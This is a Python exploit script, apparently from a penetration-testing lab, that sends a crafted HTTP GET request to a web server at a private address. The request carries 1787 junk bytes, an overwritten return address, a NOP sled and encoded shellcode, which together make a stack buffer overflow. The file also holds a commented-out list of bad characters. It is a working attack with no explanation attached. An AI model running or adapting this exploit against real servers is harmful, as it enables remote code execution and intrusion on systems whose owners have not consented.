#!/usr/bin/python3

from struct import pack
import socket, sys

def exploit():
    global ip_address
    global port
    global data

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)
        s.connect((ip_address, port))

        s.send(data)
        s.recv(1024)
        s.close()
    except Exception as e:
        print(e)
        sys.exit(1)

if __name__ == '__main__':
    '''
    badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
                b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
                b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
                b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
                b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
                b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
                b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
                b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    '''

    SHELLCODE =  b""
    SHELLCODE += b"\xba\x4e\x82\x0e\xa3\xdb\xd6\xd9\x74\x24\xf4\x5e"
    SHELLCODE += b"\x31\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\x18"
    SHELLCODE += b"\x8c\xec\x56\x58\x78\x72\x98\xa0\x79\x13\x10\x45"
    SHELLCODE += b"\x48\x13\x46\x0e\xfb\xa3\x0c\x42\xf0\x48\x40\x76"
    SHELLCODE += b"\x83\x3d\x4d\x79\x24\x8b\xab\xb4\xb5\xa0\x88\xd7"
    SHELLCODE += b"\x35\xbb\xdc\x37\x07\x74\x11\x36\x40\x69\xd8\x6a"
    SHELLCODE += b"\x19\xe5\x4f\x9a\x2e\xb3\x53\x11\x7c\x55\xd4\xc6"
    SHELLCODE += b"\x35\x54\xf5\x59\x4d\x0f\xd5\x58\x82\x3b\x5c\x42"
    SHELLCODE += b"\xc7\x06\x16\xf9\x33\xfc\xa9\x2b\x0a\xfd\x06\x12"
    SHELLCODE += b"\xa2\x0c\x56\x53\x05\xef\x2d\xad\x75\x92\x35\x6a"
    SHELLCODE += b"\x07\x48\xb3\x68\xaf\x1b\x63\x54\x51\xcf\xf2\x1f"
    SHELLCODE += b"\x5d\xa4\x71\x47\x42\x3b\x55\xfc\x7e\xb0\x58\xd2"
    SHELLCODE += b"\xf6\x82\x7e\xf6\x53\x50\x1e\xaf\x39\x37\x1f\xaf"
    SHELLCODE += b"\xe1\xe8\x85\xa4\x0c\xfc\xb7\xe7\x58\x31\xfa\x17"
    SHELLCODE += b"\x99\x5d\x8d\x64\xab\xc2\x25\xe2\x87\x8b\xe3\xf5"
    SHELLCODE += b"\xe8\xa1\x54\x69\x17\x4a\xa5\xa0\xdc\x1e\xf5\xda"
    SHELLCODE += b"\xf5\x1e\x9e\x1a\xf9\xca\x31\x4a\x55\xa5\xf1\x3a"
    SHELLCODE += b"\x15\x15\x9a\x50\x9a\x4a\xba\x5b\x70\xe3\x51\xa6"
    SHELLCODE += b"\x13\xcc\x0e\x60\x63\xa4\x4c\x70\x76\x13\xd8\x96"
    SHELLCODE += b"\x1c\x4b\x8c\x01\x89\xf2\x95\xd9\x28\xfa\x03\xa4"
    SHELLCODE += b"\x6b\x70\xa0\x59\x25\x71\xcd\x49\xd2\x71\x98\x33"
    SHELLCODE += b"\x75\x8d\x36\x5b\x19\x1c\xdd\x9b\x54\x3d\x4a\xcc"
    SHELLCODE += b"\x31\xf3\x83\x98\xaf\xaa\x3d\xbe\x2d\x2a\x05\x7a"
    SHELLCODE += b"\xea\x8f\x88\x83\x7f\xab\xae\x93\xb9\x34\xeb\xc7"
    SHELLCODE += b"\x15\x63\xa5\xb1\xd3\xdd\x07\x6b\x8a\xb2\xc1\xfb"
    SHELLCODE += b"\x4b\xf9\xd1\x7d\x54\xd4\xa7\x61\xe5\x81\xf1\x9e"
    SHELLCODE += b"\xca\x45\xf6\xe7\x36\xf6\xf9\x32\xf3\x16\x18\x96"
    SHELLCODE += b"\x0e\xbf\x85\x73\xb3\xa2\x35\xae\xf0\xda\xb5\x5a"
    SHELLCODE += b"\x89\x18\xa5\x2f\x8c\x65\x61\xdc\xfc\xf6\x04\xe2"
    SHELLCODE += b"\x53\xf6\x0c"

    JUNK = b'A'*1787
    EIP = pack('<L', 0x775f211b)
    PADDING = b'\x90'*16
    ESP = PADDING + SHELLCODE

    payload = JUNK + EIP + ESP
    data = b'GET ' + payload + b' HTTP/1.1\r\n\r\n'

    ip_address = '192.168.200.131'
    port = 80
    exploit()
